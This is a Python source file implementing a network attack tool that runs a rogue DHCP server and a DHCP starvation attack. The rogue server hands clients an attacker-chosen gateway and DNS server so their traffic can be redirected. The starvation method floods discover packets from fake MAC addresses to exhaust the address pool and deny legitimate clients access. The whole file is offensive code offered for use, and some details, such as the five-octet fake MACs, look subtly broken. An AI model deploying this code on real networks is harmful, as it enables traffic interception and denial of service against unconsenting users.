"""
DHCP Rogue Server & Starvation
================================
Rogue DHCP server deployment and DHCP starvation attacks.

Rogue DHCP: Hand out attacker-controlled DNS/gateway to redirect traffic.
Starvation: Exhaust DHCP pool to deny legitimate clients network access.
"""

import random
import socket
import struct
import threading
import time
from typing import Dict, List, Optional, Tuple


class DHCPRogue:
    """Rogue DHCP server and starvation engine."""

    DHCP_DISCOVER = 1
    DHCP_OFFER = 2
    DHCP_REQUEST = 3
    DHCP_ACK = 5
    DHCP_NAK = 6

    def __init__(self, iface: str):
        self.iface = iface
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self.leases: Dict[str, Tuple[str, float]] = {}
        self.pool = [f"192.168.100.{i}" for i in range(10, 250)]
        self.gateway = "192.168.100.1"
        self.dns = "192.168.100.1"
        self.lease_time = 3600
        self.stats = {
            "offers_sent": 0,
            "acks_sent": 0,
            "leases_given": 0,
        }

    def _build_dhcp_packet(
        self,
        msg_type: int,
        xid: bytes,
        client_mac: bytes,
        yiaddr: str = "0.0.0.0",
    ) -> bytes:
        """Build a minimal DHCP packet."""
        yiaddr_bytes = socket.inet_aton(yiaddr)
        pkt = bytearray(240)
        pkt[0] = 2 if msg_type in (self.DHCP_OFFER, self.DHCP_ACK) else 1
        pkt[1] = 1  # Ethernet
        pkt[2] = 6  # MAC length
        pkt[4:8] = xid
        pkt[16:20] = yiaddr_bytes
        pkt[28:34] = client_mac
        # Magic cookie
        pkt[236:240] = bytes([0x63, 0x82, 0x53, 0x63])

        # DHCP Message Type option
        opts = bytes([53, 1, msg_type])
        # Server Identifier
        opts += bytes([54, 4]) + socket.inet_aton(self.gateway)
        # Lease Time
        opts += bytes([51, 4]) + struct.pack(">I", self.lease_time)
        # Subnet Mask
        opts += bytes([1, 4]) + socket.inet_aton("255.255.255.0")
        # Router
        opts += bytes([3, 4]) + socket.inet_aton(self.gateway)
        # DNS Server
        opts += bytes([6, 4]) + socket.inet_aton(self.dns)
        # End option
        opts += bytes([255])

        return bytes(pkt) + opts

    def start(self) -> bool:
        """Start rogue DHCP server."""
        self._running = True
        self._thread = threading.Thread(
            target=self._dhcp_loop,
            daemon=True,
        )
        self._thread.start()
        return True

    def _dhcp_loop(self) -> None:
        """Main DHCP packet processing loop."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.bind(("0.0.0.0", 67))
            sock.settimeout(2.0)

            while self._running:
                try:
                    data, addr = sock.recvfrom(1024)
                    if len(data) < 240:
                        continue
                    self._handle_dhcp_packet(data, sock)
                except socket.timeout:
                    continue
        except PermissionError:
            print("[DHCP] Requires root privileges to bind port 67")
        except Exception as e:
            print(f"[DHCP] Loop error: {e}")

    def _handle_dhcp_packet(self, data: bytes, sock: socket.socket) -> None:
        """Process incoming DHCP packet."""
        msg_type = data[242] if len(data) > 242 else 0
        xid = data[4:8]
        client_mac = data[28:34]
        mac_str = ":".join(f"{b:02x}" for b in client_mac)

        if msg_type == self.DHCP_DISCOVER:
            # Offer an IP
            ip = self._next_available_ip()
            if ip:
                offer = self._build_dhcp_packet(
                    self.DHCP_OFFER, xid, client_mac, ip
                )
                sock.sendto(offer, ("255.255.255.255", 68))
                self.stats["offers_sent"] += 1

        elif msg_type == self.DHCP_REQUEST:
            # Acknowledge
            ip = self._next_available_ip()
            if ip:
                ack = self._build_dhcp_packet(
                    self.DHCP_ACK, xid, client_mac, ip
                )
                sock.sendto(ack, ("255.255.255.255", 68))
                self.leases[mac_str] = (ip, time.time())
                self.stats["acks_sent"] += 1
                self.stats["leases_given"] += 1

    def _next_available_ip(self) -> Optional[str]:
        """Get next available IP from pool."""
        used = {ip for ip, _ in self.leases.values()}
        for ip in self.pool:
            if ip not in used:
                return ip
        return None

    def starve(self, target_mac_prefix: str = "aa:bb:cc") -> int:
        """
        DHCP starvation attack: exhaust pool with fake MACs.

        Args:
            target_mac_prefix: MAC prefix for fake clients

        Returns:
            Number of IPs requested
        """
        count = 0
        try:
            from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp
            for i in range(min(50, len(self.pool))):
                fake_mac = f"{target_mac_prefix}:{i:02x}:{random.randint(0,255):02x}"
                pkt = (
                    Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff")
                    / IP(src="0.0.0.0", dst="255.255.255.255")
                    / UDP(sport=68, dport=67)
                    / BOOTP(chaddr=fake_mac.replace(":", ""))
                    / DHCP(options=[("message-type", "discover"), "end"])
                )
                sendp(pkt, iface=self.iface, verbose=0)
                count += 1
                time.sleep(0.1)
        except Exception as e:
            print(f"[DHCP] Starvation error: {e}")
        return count

    def stop(self) -> None:
        """Stop rogue DHCP server."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=3)

    def get_stats(self) -> Dict[str, any]:
        """Return DHCP statistics."""
        return {
            **self.stats,
            "active_leases": len(self.leases),
            "pool_size": len(self.pool),
        }
